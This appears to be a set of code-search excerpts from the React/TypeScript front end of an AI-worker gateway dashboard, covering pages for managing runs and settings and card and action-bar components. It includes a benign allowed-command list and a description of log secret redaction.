'POST' });\n        if (res.ok) {\n          succeeded++;\n        } else {\n          failed++;\n        }\n      } catch {\n        failed++;\n      }\n    }\n\n    setActionLoading(false);\n    setShowStopConfirm(false);\n    setSelectedRuns(new Set());\n\n    if (succeeded > 0) {\n      addToast('success', `Stopped ${succeeded} run(s)`);\n    }\n    if (failed > 0) {\n      addToast('error', `Failed to stop ${failed} run(s)`);\n    }\n\n    fetchRuns();\n  };\n\n  // Load more\n  const loadMore = () => {\n    fetchRuns(true);\n  };\n\n  return (\n    <div className=\"runs-page\">\n      {/* Header with actions */}\n      <div className=\"page-header\">\n        <h2 className=\"page-title\">Runs</h2>\n        <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>\n          {canOperate && selectedRuns.size > 0 && (\n            <button\n              className=\"btn btn-danger btn-sm\"\n              onClick={() => setShowStopConfirm(true)}\n            >\n              Stop {selectedRuns.size} selected\n            </button>\n          )}\n          {canOperate && (\n            <button className=\"btn btn-primary\" onClick={() => setShowCreateModal(true)}>\n              New Run\n            </button>\n          )}\n        </div>\n      </div>\n\n      {/* Filters */}\n      <FilterBar hasActiveFilters={hasActiveFilters} onReset={resetFilters}>\n        <SearchInput\n          value={search}\n          onChange={(val) => updateFilter('search', val)}\n          placeholder=\"Search runs...\"\n        />\n        <FilterSelect\n          label=\"Status\"\n          value={status}\n          options={statusOptions}\n          onChange={(val) => updateFilter('status', val)}\n        />\n        <FilterSelect\n          label=\"Worker\"\n          value={workerType}\n          options={workerTypeOptions}\n          onChange={(val) => updateFilter('workerType', val)}\n        />\n        <FilterSelect\n          label=\"Client\"\n          value={clientId}\n          options={clientOptions}\n          onChange={(val) => updateFilter('clientId', val)}\n        />\n        {waitingApproval && (\n          <div\n            style={{\n              padding: '8px 12px',\n              background: 'rgba(163, 113, 247, 0.15)',\n              borderRadius: '6px',\n              fontSize: '12px',\n              color: 'var(--accent-purple)',\n              display: 'flex',\n              alignItems: 'center',\n              gap: '8px',\n            }}\n          >\n            Showing runs waiting approval\n            <button\n              onClick={() => updateFilter('waitingApproval', '')}\n              style={{", "metadata": {"file": "ui/src/pages/Runs.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Runs.tsx", "location": "ui/src/pages/Runs.tsx:401", "score": 0.0, "content": "                background: 'none',\n                border: 'none',\n                color: 'inherit',\n                cursor: 'pointer',\n                padding: '2px',\n              }}\n            >\n              \u00d7\n            </button>\n          </div>\n        )}\n      </FilterBar>\n\n      {/* Results count */}\n      <div\n        style={{\n          fontSize: '13px',\n          color: 'var(--text-muted)',\n          marginBottom: '12px',\n        }}\n      >\n        {loading ? 'Loading...' : `${total} runs found`}\n      </div>\n\n      {/* Runs list */}\n      {loading ? (\n        <div className=\"loading\">\n          <div className=\"spinner\" />\n        </div>\n      ) : runs.length === 0 ? (\n        <div className=\"empty-state\">\n          <h2>No runs found</h2>\n          <p>\n            {hasActiveFilters\n              ? 'Try adjusting your filters.'\n              : 'Create a new run to get started.'}\n          </p>\n        </div>\n      ) : (\n        <>\n          <div className=\"run-list\">\n            {runs.map((run) => (\n              <div\n                key={run.id}\n                style={{\n                  display: 'flex',\n                  gap: '12px',\n                  alignItems: 'flex-start',\n                }}\n              >\n                {canOperate && run.status === 'running' && (\n                  <input\n                    type=\"checkbox\"\n                    checked={selectedRuns.has(run.id)}\n                    onChange={() => toggleRunSelection(run.id)}\n                    style={{\n                      marginTop: '18px',\n                      width: '18px',\n                      height: '18px',\n                      accentColor: 'var(--accent-blue)',\n                    }}\n                    aria-label={`Select run ${run.id}`}\n                  />\n                )}\n                <div style={{ flex: 1 }}>\n                  <RunCard run={run} />\n                </div>\n              </div>\n            ))}\n          </div>\n\n          {/* Load more */}\n          {runs.length < total && (\n            <div style={{ textAlign: 'center', marginTop: '16px' }}>\n              <button\n                className=\"btn\"\n                onClick={loadMore}\n                disabled={loadingMore}\n              >\n                {loadingMore ? 'Loading...' : `Load More (${runs.length}/${total})`}\n              </button>\n            </div>\n          )}\n        </>\n      )}\n\n      {/* Stop confirmation modal */}\n      <ConfirmModal\n        open={showStopConfirm}\n        onClose={() => setShowStopConfirm(false)}\n        onConfirm={stopSelectedRuns}\n        title=\"Stop Selected Runs\"\n        message={`Are you sure you want to stop ${selectedRuns.size} run(s)? This will send a stop signal to each running process.`}\n        confirmText=\"Stop Runs\"\n        danger\n        loading={actionLoading}\n      />\n\n      {/* Create Run Modal */}\n      {canOperate && (\n        <Modal\n          open={showCreateModal}\n          onClose={() => setShowCreateModal(false)}\n          title=\"Create New Run\"\n          footer={\n            <>\n              <button className=\"btn\" onClick={() => setShowCreateModal(false)}>\n                Cancel\n              </button>\n              <button\n                className=\"btn btn-primary\"\n                onClick={handleCreateRun}\n                disabled={createLoading}\n              >\n                {createLoading ? 'Creating...' : 'Create Run'}\n              </button>\n            </>\n          }\n        >\n          <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>\n            {/* Worker Type Selection */}\n            <div>\n              <label className=\"form-label\">Worker Type</label>\n              <select\n                value={createWorkerType}\n                onChange={(e) => {\n                  setCreateWorkerType(e.target.value);\n                  setCreateIntegration('claude');\n                  setCreateModel('');\n                  setCreateCustomModel('');\n                }}\n                className=\"form-input\"\n                style={{ cursor: 'pointer' }}\n              >\n                <option value=\"claude\">Claude (Anthropic)</option>\n                <option value=\"ollama-launch\">Ollama Launch</option>\n                <option value=\"codex\">Codex CLI</option>\n                <option value=\"gemini\">Gemini CLI</option>\n                <option value=\"rev\">Rev</option>\n              </select>\n            </div>\n\n            {/* Integration Selection (for Ollama Launch) */}\n            {supportsIntegrationSelection && (\n              <div>\n                <label className=\"form-label\">IDE Integration</label>\n                <select\n                  value={createIntegration}\n                  onChange={(e) => setCreateIntegration(e.target.value)}\n                  className=\"form-input\"\n                  style={{ cursor: 'pointer' }}\n                >\n                  {ollamaIntegrations.map((integration) => (\n                    <option key={integration.value} value={integration.value}>\n                      {integration.label}\n                    </option>\n                  ))}\n                </select>\n              </div>\n            )}\n\n            {/* Model Selection (for Ollama Launch/Gemini) */}\n            {supportsModelSelection && (\n              <div>\n                <label className=\"form-label\">Model</label>\n                <select\n                  value={createModel}\n                  onChange={(e) => setCreateModel(e.target.value)}\n                  className=\"form-input\"\n                  style={{ cursor: 'pointer' }}\n                >\n                  <option value=\"\">Default Model</option>\n                  {availableModels.map((model) => (\n                    <option key={model.value} value={model.value}>\n                      {model.label}\n                    </option>\n                  ))}\n                </select>\n                {createModel === 'custom' && (\n                  <input\n                    type=\"text\"\n                    value={createCustomModel}\n                    onChange={(e) => setCreateCustomModel(e.target.value)}\n                    placeholder=\"Enter custom model name...\"\n                    className=\"form-input\"\n                    style={{ marginTop: '8px' }}\n                  />\n                )}\n              </div>\n            )}\n\n            {/* Command/Prompt */}\n            <div>\n              <label className=\"form-label\">Command / Prompt (optional)</label>\n              <input\n                type=\"text\"\n                value={createCommand}\n                onChange={(e) => setCreateCommand(e.target.value)}\n                placeholder=\"Enter initial command or prompt...\"\n                className=\"form-input\"", "metadata": {"file": "ui/src/pages/Runs.tsx", "start_line": 401, "end_line": 600, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Runs.tsx", "location": "ui/src/pages/Runs.tsx:601", "score": 0.0, "content": "              />\n            </div>\n\n            {/* Autonomous Mode Toggle */}\n            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>\n              <input\n                type=\"checkbox\"\n                id=\"autonomous\"\n                checked={createAutonomous}\n                onChange={(e) => setCreateAutonomous(e.target.checked)}\n                style={{ width: '18px', height: '18px', accentColor: 'var(--accent-blue)' }}\n              />\n              <label htmlFor=\"autonomous\" style={{ cursor: 'pointer' }}>\n                Autonomous mode (no prompt required)\n              </label>\n            </div>\n\n            {/* Info Box */}\n            <div\n              style={{\n                padding: '12px',\n                background: 'var(--bg-tertiary)',\n                borderRadius: '6px',\n                fontSize: '13px',\n                color: 'var(--text-secondary)',\n              }}\n            >\n              <strong>Tip:</strong> After creating the run, you'll see your credentials and the command to start\n              the ai-runner worker from your terminal. You can copy each piece individually or copy the entire command.\n            </div>\n          </div>\n        </Modal>\n      )}\n\n      {/* Credentials Modal */}\n      {showCredentialsModal && credentials && (\n        <Modal\n          open={showCredentialsModal}\n          onClose={() => setShowCredentialsModal(false)}\n          title=\"Run Created Successfully! \ud83c\udf89\"\n          footer={\n            <button\n              className=\"btn btn-primary\"\n              onClick={() => setShowCredentialsModal(false)}\n            >\n              Done\n            </button>\n          }\n        >\n          <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>\n            <p style={{ color: 'var(--text-secondary)', margin: 0 }}>\n              Your run has been created. Here are your credentials and the command to start the worker:\n            </p>\n\n            {/* Run ID */}\n            <div>\n              <label style={{ display: 'block', fontSize: '13px', fontWeight: '600', marginBottom: '6px', color: 'var(--text-secondary)' }}>\n                Run ID:\n              </label>\n              <div\n                style={{\n                  display: 'flex',\n                  gap: '8px',\n                  background: 'var(--bg-tertiary)',\n                  padding: '12px',\n                  borderRadius: '6px',\n                  fontFamily: 'monospace',\n                  fontSize: '14px',\n                }}\n              >\n                <code style={{ flex: 1, color: 'var(--accent-blue)', wordBreak: 'break-all' }}>\n                  {credentials.id}\n                </code>\n                <button\n                  onClick={() => {\n                    navigator.clipboard.writeText(credentials.id);\n                    addToast('success', 'Run ID copied to clipboard');\n                  }}\n                  style={{\n                    background: 'transparent',\n                    border: 'none',\n                    color: 'var(--accent-blue)',\n                    cursor: 'pointer',\n                    fontSize: '12px',\n                    padding: '0 8px',\n                  }}\n                >\n                  Copy\n                </button>\n              </div>\n            </div>\n\n            {/* Token */}\n            <div>\n              <label style={{ display: 'block', fontSize: '13px', fontWeight: '600', marginBottom: '6px', color: 'var(--text-secondary)' }}>\n                Capability Token:\n              </label>\n              <div\n                style={{\n                  display: 'flex',\n                  gap: '8px',\n                  background: 'var(--bg-tertiary)',\n                  padding: '12px',\n                  borderRadius: '6px',\n                  fontFamily: 'monospace',\n                  fontSize: '14px',\n                }}\n              >\n                <code style={{ flex: 1, color: 'var(--accent-green)', wordBreak: 'break-all' }}>\n                  {credentials.token}\n                </code>\n                <button\n                  onClick={() => {\n                    navigator.clipboard.writeText(credentials.token);\n                    addToast('success', 'Token copied to clipboard');\n                  }}\n                  style={{\n                    background: 'transparent',\n                    border: 'none',\n                    color: 'var(--accent-blue)',\n                    cursor: 'pointer',\n                    fontSize: '12px',\n                    padding: '0 8px',\n                  }}\n                >\n                  Copy\n                </button>\n              </div>\n            </div>\n\n            {/* Start Command */}\n            <div>\n              <label style={{ display: 'block', fontSize: '13px', fontWeight: '600', marginBottom: '6px', color: 'var(--text-secondary)' }}>\n                Start Command:\n              </label>\n              <div\n                style={{\n                  display: 'flex',\n                  gap: '8px',\n                  background: 'var(--bg-tertiary)',\n                  padding: '12px',\n                  borderRadius: '6px',\n                  fontFamily: 'monospace',\n                  fontSize: '12px',\n                  overflow: 'auto',\n                }}\n              >\n                <code style={{ flex: 1, color: 'var(--text-primary)', wordBreak: 'break-all' }}>\n                  {credentials.command}\n                </code>\n                <button\n                  onClick={() => {\n                    navigator.clipboard.writeText(credentials.command);\n                    addToast('success', 'Command copied to clipboard');\n                  }}\n                  style={{\n                    background: 'transparent',\n                    border: 'none',\n                    color: 'var(--accent-blue)',\n                    cursor: 'pointer',\n                    fontSize: '12px',\n                    padding: '0 8px',\n                    flexShrink: 0,\n                  }}\n                >\n                  Copy\n                </button>\n              </div>\n            </div>\n\n            {/* Info Box */}\n            <div\n              style={{\n                padding: '12px',\n                background: 'var(--bg-secondary)',\n                border: '1px solid var(--border-color)',\n                borderRadius: '6px',\n                fontSize: '13px',\n                color: 'var(--text-secondary)',\n              }}\n            >\n              <strong>\ud83d\udca1 Next Steps:</strong>\n              <ol style={{ marginTop: '8px', paddingLeft: '20px', margin: '8px 0 0 0' }}>\n                <li>Copy the token and run ID above</li>\n                <li>Open your terminal/command prompt</li>\n                <li>Paste and run the start command</li>\n                <li>The worker will connect to this gateway</li>\n              </ol>\n            </div>\n          </div>\n        </Modal>\n      )}\n    </div>\n  );\n}\n\nexport default Runs;", "metadata": {"file": "ui/src/pages/Runs.tsx", "start_line": 601, "end_line": 797, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Settings.tsx", "location": "ui/src/pages/Settings.tsx:1", "score": 0.0, "content": "import { useState, useEffect } from 'react';\nimport { useToast, Modal } from '../components/ui';\n\ninterface AuthStatus {\n  authenticated: boolean;\n  cfAccessEnabled: boolean;\n  email?: string;\n  user?: {\n    id: string;\n    username: string;\n    role: string;\n  };\n  needsSetup: boolean;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n  onLogout: () => void;\n}\n\nconst allowedCommands = [\n  'npm test',\n  'npm run build',\n  'npm run lint',\n  'git diff',\n  'git status',\n  'git log --oneline -10',\n  'ls -la',\n  'pwd',\n  'pytest',\n  'cargo test',\n];\n\nexport function Settings({ user, onLogout }: Props) {\n  const { addToast } = useToast();\n\n  // State\n  const [authStatus, setAuthStatus] = useState<AuthStatus | null>(null);\n  const [loading, setLoading] = useState(true);\n  const [showLogoutConfirm, setShowLogoutConfirm] = useState(false);\n\n  // UI preferences (in-memory for now)\n  const [darkMode, setDarkMode] = useState(true);\n  const [autoScroll, setAutoScroll] = useState(true);\n  const [compactView, setCompactView] = useState(false);\n\n  const isAdmin = user?.role === 'admin';\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n\n  // Fetch auth status\n  useEffect(() => {\n    const fetchAuthStatus = async () => {\n      try {\n        const res = await fetch('/api/auth/status');\n        if (res.ok) {\n          setAuthStatus(await res.json());\n        }\n      } catch (err) {\n        console.error('Failed to fetch auth status:', err);\n      } finally {\n        setLoading(false);\n      }\n    };\n\n    fetchAuthStatus();\n  }, []);\n\n  // Handle logout\n  const handleLogout = async () => {\n    try {\n      await fetch('/api/auth/logout', { method: 'POST' });\n      addToast('success', 'Logged out successfully');\n      setShowLogoutConfirm(false);\n      onLogout();\n    } catch (err) {\n      addToast('error', 'Failed to logout');\n    }\n  };\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"settings-page\">\n      <h2 className=\"page-title\">Settings</h2>\n\n      {/* User Info */}\n      <section className=\"settings-section\">\n        <h3 className=\"section-title\">Account</h3>\n        <div className=\"settings-card\">\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Username</span>\n            <span className=\"settings-value\">{user?.username || 'Unknown'}</span>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Role</span>\n            <span\n              className=\"settings-value\"\n              style={{\n                textTransform: 'capitalize',\n                color:\n                  user?.role === 'admin'\n                    ? 'var(--accent-purple)'\n                    : user?.role === 'operator'\n                    ? 'var(--accent-blue)'\n                    : 'var(--text-secondary)',\n              }}\n            >\n              {user?.role || 'Unknown'}\n            </span>\n          </div>\n          {authStatus?.cfAccessEnabled && authStatus.email && (\n            <div className=\"settings-row\">\n              <span className=\"settings-label\">Cloudflare Access</span>\n              <span className=\"settings-value\">{authStatus.email}</span>\n            </div>\n          )}\n          <div className=\"settings-row\" style={{ borderBottom: 'none' }}>\n            <button\n              className=\"btn btn-danger\"\n              onClick={() => setShowLogoutConfirm(true)}\n            >\n              Logout\n            </button>\n          </div>\n        </div>\n      </section>\n\n      {/* Authentication */}\n      <section className=\"settings-section\">\n        <h3 className=\"section-title\">Authentication</h3>\n        <div className=\"settings-card\">\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Cloudflare Access</span>\n            <span\n              className=\"settings-value\"\n              style={{\n                color: authStatus?.cfAccessEnabled\n                  ? 'var(--accent-green)'\n                  : 'var(--text-muted)',\n              }}\n            >\n              {authStatus?.cfAccessEnabled ? 'Enabled' : 'Disabled'}\n            </span>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Local Auth</span>\n            <span\n              className=\"settings-value\"\n              style={{\n                color: !authStatus?.cfAccessEnabled\n                  ? 'var(--accent-green)'\n                  : 'var(--text-muted)',\n              }}\n            >\n              {!authStatus?.cfAccessEnabled ? 'Active' : 'Fallback Only'}\n            </span>\n          </div>\n        </div>\n        <p className=\"settings-hint\">\n          For production deployments, Cloudflare Access provides zero-trust authentication.\n          Set <code>CF_ACCESS_TEAM</code> and <code>CF_ACCESS_AUD</code> environment variables.\n        </p>\n      </section>\n\n      {/* UI Preferences */}\n      <section className=\"settings-section\">\n        <h3 className=\"section-title\">UI Preferences</h3>\n        <div className=\"settings-card\">\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Dark Mode</span>\n            <label className=\"switch\">\n              <input\n                type=\"checkbox\"\n                checked={darkMode}\n                onChange={(e) => setDarkMode(e.target.checked)}\n              />\n              <span className=\"slider\" />\n            </label>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Auto-scroll Logs</span>\n            <label className=\"switch\">\n              <input\n                type=\"checkbox\"\n                checked={autoScroll}\n                onChange={(e) => setAutoScroll(e.target.checked)}\n              />\n              <span className=\"slider\" />\n            </label>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Compact View</span>\n            <label className=\"switch\">\n              <input", "metadata": {"file": "ui/src/pages/Settings.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Settings.tsx", "location": "ui/src/pages/Settings.tsx:201", "score": 0.0, "content": "                type=\"checkbox\"\n                checked={compactView}\n                onChange={(e) => setCompactView(e.target.checked)}\n              />\n              <span className=\"slider\" />\n            </label>\n          </div>\n        </div>\n      </section>\n\n      {/* Allowed Commands (Operator/Admin) */}\n      {canOperate && (\n        <section className=\"settings-section\">\n          <h3 className=\"section-title\">Allowed Commands</h3>\n          <div className=\"settings-card\">\n            <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '12px' }}>\n              These commands can be executed on connected clients:\n            </p>\n            <div\n              style={{\n                display: 'flex',\n                flexWrap: 'wrap',\n                gap: '8px',\n              }}\n            >\n              {allowedCommands.map((cmd) => (\n                <code\n                  key={cmd}\n                  style={{\n                    padding: '4px 8px',\n                    background: 'var(--bg-tertiary)',\n                    borderRadius: '4px',\n                    fontSize: '12px',\n                  }}\n                >\n                  {cmd}\n                </code>\n              ))}\n            </div>\n          </div>\n          <p className=\"settings-hint\">\n            Additional commands can be configured via the <code>EXTRA_ALLOWED_COMMANDS</code> environment variable.\n          </p>\n        </section>\n      )}\n\n      {/* Redaction Patterns (Admin) */}\n      {isAdmin && (\n        <section className=\"settings-section\">\n          <h3 className=\"section-title\">Secret Redaction</h3>\n          <div className=\"settings-card\">\n            <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '12px' }}>\n              These patterns are automatically redacted from logs:\n            </p>\n            <ul style={{ fontSize: '12px', fontFamily: 'monospace', paddingLeft: '20px', margin: 0 }}>\n              <li>API keys (sk-*, ghp_*, ghs_*, npm_*)</li>\n              <li>PEM private keys</li>\n              <li>Bearer tokens</li>\n              <li>Authorization headers</li>\n            </ul>\n          </div>\n        </section>\n      )}\n\n      {/* Data Retention (Admin) */}\n      {isAdmin && (\n        <section className=\"settings-section\">\n          <h3 className=\"section-title\">Data Retention</h3>\n          <div className=\"settings-card\">\n            <div className=\"settings-row\">\n              <span className=\"settings-label\">Runs & Events</span>\n              <span className=\"settings-value\">No automatic pruning</span>\n            </div>\n            <div className=\"settings-row\">\n              <span className=\"settings-label\">Artifacts</span>\n              <span className=\"settings-value\">Stored in .data/artifacts/</span>\n            </div>\n            <div className=\"settings-row\">\n              <span className=\"settings-label\">Audit Log</span>\n              <span className=\"settings-value\">Retained indefinitely</span>\n            </div>\n          </div>\n          <p className=\"settings-hint\">\n            Configure retention settings via environment variables or manually prune old data.\n          </p>\n        </section>\n      )}\n\n      {/* System Info */}\n      <section className=\"settings-section\">\n        <h3 className=\"section-title\">System Information</h3>\n        <div className=\"settings-card\">\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Gateway Version</span>\n            <span className=\"settings-value\">1.0.0</span>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Data Directory</span>\n            <span className=\"settings-value\">.data/</span>\n          </div>\n          <div className=\"settings-row\">\n            <span className=\"settings-label\">Database</span>\n            <span className=\"settings-value\">SQLite (WAL mode)</span>\n          </div>\n        </div>\n      </section>\n\n      {/* Logout Confirmation */}\n      <Modal\n        open={showLogoutConfirm}\n        onClose={() => setShowLogoutConfirm(false)}\n        title=\"Confirm Logout\"\n        footer={\n          <>\n            <button className=\"btn\" onClick={() => setShowLogoutConfirm(false)}>\n              Cancel\n            </button>\n            <button className=\"btn btn-danger\" onClick={handleLogout}>\n              Logout\n            </button>\n          </>\n        }\n      >\n        <p>Are you sure you want to logout?</p>\n      </Modal>\n    </div>\n  );\n}\n\nexport default Settings;", "metadata": {"file": "ui/src/pages/Settings.tsx", "start_line": 201, "end_line": 330, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/ActionBar.tsx", "location": "ui/src/components/ui/ActionBar.tsx:1", "score": 0.0, "content": "import { ReactNode } from 'react';\n\ninterface ActionBarProps {\n  children: ReactNode;\n  visible?: boolean;\n}\n\nexport function ActionBar({ children, visible = true }: ActionBarProps) {\n  if (!visible) return null;\n\n  return (\n    <>\n      {/* Spacer to prevent content from being hidden behind action bar */}\n      <div style={{ height: '80px' }} />\n\n      <div\n        className=\"action-bar\"\n        style={{\n          position: 'fixed',\n          bottom: '56px', // Above bottom nav on mobile\n          left: 0,\n          right: 0,\n          padding: '12px 16px',\n          background: 'var(--bg-secondary)',\n          borderTop: '1px solid var(--border-color)',\n          display: 'flex',\n          gap: '8px',\n          justifyContent: 'center',\n          alignItems: 'center',\n          flexWrap: 'wrap',\n          zIndex: 90,\n          boxShadow: '0 -4px 12px rgba(0, 0, 0, 0.2)',\n        }}\n      >\n        {children}\n      </div>\n    </>\n  );\n}\n\n// Desktop-friendly action buttons group\ninterface ActionButtonProps {\n  onClick: () => void;\n  disabled?: boolean;\n  variant?: 'default' | 'primary' | 'danger';\n  icon?: string;\n  children: ReactNode;\n  fullWidth?: boolean;\n}\n\nexport function ActionButton({\n  onClick,\n  disabled = false,\n  variant = 'default',\n  icon,\n  children,\n  fullWidth = false,\n}: ActionButtonProps) {\n  const variantStyles = {\n    default: {\n      background: 'var(--bg-tertiary)',\n      borderColor: 'var(--border-color)',\n      color: 'var(--text-primary)',\n    },\n    primary: {\n      background: 'var(--accent-blue)',\n      borderColor: 'var(--accent-blue)',\n      color: 'white',\n    },\n    danger: {\n      background: 'var(--accent-red)',\n      borderColor: 'var(--accent-red)',\n      color: 'white',\n    },\n  };\n\n  const style = variantStyles[variant];\n\n  return (\n    <button\n      onClick={onClick}\n      disabled={disabled}\n      style={{\n        display: 'inline-flex',\n        alignItems: 'center',\n        justifyContent: 'center',\n        gap: '8px',\n        padding: '10px 16px',\n        minWidth: '44px', // Touch target\n        minHeight: '44px', // Touch target\n        fontSize: '14px',\n        fontWeight: 500,\n        border: `1px solid ${style.borderColor}`,\n        borderRadius: '8px',\n        background: style.background,\n        color: style.color,\n        cursor: disabled ? 'not-allowed' : 'pointer',\n        opacity: disabled ? 0.5 : 1,\n        transition: 'all 0.15s ease',\n        flex: fullWidth ? 1 : undefined,\n      }}\n      aria-disabled={disabled}\n    >\n      {icon && <span style={{ fontSize: '16px' }}>{icon}</span>}\n      {children}\n    </button>\n  );\n}\n\nexport default ActionBar;", "metadata": {"file": "ui/src/components/ui/ActionBar.tsx", "start_line": 1, "end_line": 110, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/ClientCard.tsx", "location": "ui/src/components/ui/ClientCard.tsx:1", "score": 0.0, "content": "import { useNavigate } from 'react-router-dom';\nimport { StatusPill, ConnectionStatus } from './StatusPill';\n\nexport interface Client {\n  id: string;\n  display_name: string;\n  agent_id: string;\n  last_seen_at: number;\n  created_at?: number;\n  version?: string | null;\n  capabilities?: string[] | null;\n  status: ConnectionStatus;\n  operator_enabled: number;\n  runCounts?: {\n    total: number;\n    running: number;\n    failed: number;\n  };\n}\n\ninterface ClientCardProps {\n  client: Client;\n  compact?: boolean;\n  onClick?: () => void;\n}\n\nfunction formatRelativeTime(timestamp: number): string {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = now - timestamp;\n\n  if (diff < 60) return 'just now';\n  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;\n  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;\n  return `${Math.floor(diff / 86400)}d ago`;\n}\n\nexport function ClientCard({ client, compact = false, onClick }: ClientCardProps) {\n  const navigate = useNavigate();\n  const handleClick = onClick || (() => navigate(`/clients/${client.id}`));\n\n  return (\n    <div\n      className=\"client-card\"\n      onClick={handleClick}\n      style={{\n        display: 'flex',\n        flexDirection: compact ? 'row' : 'column',\n        alignItems: compact ? 'center' : 'flex-start',\n        gap: compact ? '12px' : '8px',\n        padding: compact ? '10px 12px' : '14px 16px',\n        background: 'var(--bg-secondary)',\n        border: '1px solid var(--border-color)',\n        borderRadius: '8px',\n        cursor: 'pointer',\n        transition: 'all 0.15s ease',\n      }}\n      onMouseEnter={(e) => {\n        e.currentTarget.style.borderColor = 'var(--accent-blue)';\n        e.currentTarget.style.background = 'var(--bg-tertiary)';\n      }}\n      onMouseLeave={(e) => {\n        e.currentTarget.style.borderColor = 'var(--border-color)';\n        e.currentTarget.style.background = 'var(--bg-secondary)';\n      }}\n      role=\"button\"\n      tabIndex={0}\n      onKeyDown={(e) => {\n        if (e.key === 'Enter' || e.key === ' ') {\n          e.preventDefault();\n          handleClick();\n        }\n      }}\n      aria-label={`Client ${client.display_name}, status: ${client.status}`}\n    >\n      {/* Status indicator */}\n      <div\n        style={{\n          width: compact ? '12px' : '48px',\n          height: compact ? '12px' : '48px',\n          borderRadius: compact ? '50%' : '12px',\n          background: client.status === 'online'\n            ? 'rgba(59, 185, 80, 0.15)'\n            : client.status === 'degraded'\n              ? 'rgba(210, 153, 34, 0.15)'\n              : 'rgba(248, 81, 73, 0.15)',\n          display: 'flex',\n          alignItems: 'center',\n          justifyContent: 'center',\n          flexShrink: 0,\n        }}\n      >\n        {!compact && (\n          <span style={{ fontSize: '24px' }}>\\uD83D\\uDCBB</span>\n        )}\n      </div>\n\n      {/* Main info */}\n      <div style={{ flex: 1, minWidth: 0 }}>\n        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: compact ? 0 : '4px' }}>\n          <span\n            style={{\n              fontSize: '15px',\n              fontWeight: 600,\n              color: 'var(--text-primary)',\n            }}\n          >\n            {client.display_name}\n          </span>\n          <StatusPill status={client.status} size=\"sm\" />\n        </div>\n\n        {!compact && (\n          <>\n            <div\n              style={{\n                fontSize: '12px',\n                color: 'var(--text-secondary)',\n                fontFamily: 'monospace',\n                marginBottom: '8px',\n              }}\n            >\n              {client.agent_id}\n            </div>\n\n            <div\n              style={{\n                fontSize: '12px',\n                color: 'var(--text-secondary)',\n                display: 'flex',\n                flexWrap: 'wrap',\n                gap: '12px',\n                alignItems: 'center',\n              }}\n            >\n              <span>Last seen: {formatRelativeTime(client.last_seen_at)}</span>\n              {client.version && <span>v{client.version}</span>}\n              {!client.operator_enabled && (\n                <span style={{ color: 'var(--accent-yellow)' }}>\n                  \\u26A0 Operator disabled\n                </span>\n              )}\n            </div>\n          </>\n        )}\n      </div>\n\n      {/* Run counts */}\n      {client.runCounts && (\n        <div\n          style={{\n            display: 'flex',\n            gap: '8px',\n            alignItems: 'center',\n            flexShrink: 0,\n          }}\n        >\n          {client.runCounts.running > 0 && (\n            <span\n              title=\"Active runs\"\n              style={{\n                padding: '4px 8px',\n                fontSize: '12px',\n                background: 'rgba(59, 185, 80, 0.15)',\n                borderRadius: '4px',\n                color: 'var(--accent-green)',\n                fontWeight: 500,\n              }}\n            >\n              {client.runCounts.running} running\n            </span>\n          )}\n          {client.runCounts.failed > 0 && (\n            <span\n              title=\"Failed runs\"\n              style={{\n                padding: '4px 8px',\n                fontSize: '12px',\n                background: 'rgba(248, 81, 73, 0.15)',\n                borderRadius: '4px',\n                color: 'var(--accent-red)',\n                fontWeight: 500,\n              }}\n            >\n              {client.runCounts.failed} failed\n            </span>\n          )}\n          {client.runCounts.total > 0 && client.runCounts.running === 0 && client.runCounts.failed === 0 && (\n            <span\n              style={{\n                fontSize: '12px',\n                color: 'var(--text-muted)',\n              }}\n            >\n              {client.runCounts.total} runs\n            </span>\n          )}\n        </div>\n      )}\n    </div>\n  );", "metadata": {"file": "ui/src/components/ui/ClientCard.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/ui/ClientCard.tsx", "location": "ui/src/components/ui/ClientCard.tsx:201", "score": 0.0, "content": "}\n\n// List variant for tables\nexport function ClientRow({ client, onClick }: ClientCardProps) {\n  const navigate = useNavigate();\n  const handleClick = onClick || (() => navigate(`/clients/${client.id}`));\n\n  return (\n    <tr\n      onClick={handleClick}\n      style={{ cursor: 'pointer' }}\n      onMouseEnter={(e) => {\n        e.currentTarget.style.background = 'var(--bg-tertiary)';\n      }}\n      onMouseLeave={(e) => {\n        e.currentTarget.style.background = '';\n      }}\n    >\n      <td style={{ padding: '10px 12px' }}>\n        <div style={{ fontWeight: 500 }}>{client.display_name}</div>\n        <div style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'monospace' }}>\n          {client.agent_id}\n        </div>\n      </td>\n      <td style={{ padding: '10px 12px' }}>\n        <StatusPill status={client.status} size=\"sm\" />\n      </td>\n      <td style={{ padding: '10px 12px' }}>\n        {client.runCounts?.running || 0} / 